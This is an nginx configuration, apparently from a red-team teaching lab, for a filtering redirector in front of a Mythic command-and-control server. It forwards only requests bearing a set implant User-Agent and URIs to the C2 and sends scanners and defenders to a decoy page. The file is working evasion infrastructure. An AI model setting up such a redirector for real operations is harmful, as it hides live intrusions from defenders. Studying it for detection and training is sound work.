# Technique 2: filtering redirector with a decoy site.
# Only requests that look like the implant (right URIs and User-Agent) are
# forwarded to Mythic. Everything else - browsers, scanners, defenders -
# gets a harmless decoy page. Teaching point: blue teams fetching the
# redirector URL directly see a blog, not a C2.
map $http_user_agent $is_implant {
    default                                 0;
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) NightAgentsDemo" 1;
}

map $uri $is_c2_uri {
    default         0;
    /index          1;
    /data           1;
}

server {
    listen 8080;
    server_name _;

    access_log /redirector-logs/access.log json_combined;

    location / {
        if ($is_implant = 0) {
            return 302 https://example.com/weather;
        }
        if ($is_c2_uri = 0) {
            return 302 https://example.com/weather;
        }
        proxy_pass http://host.docker.internal:80;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
    }
}
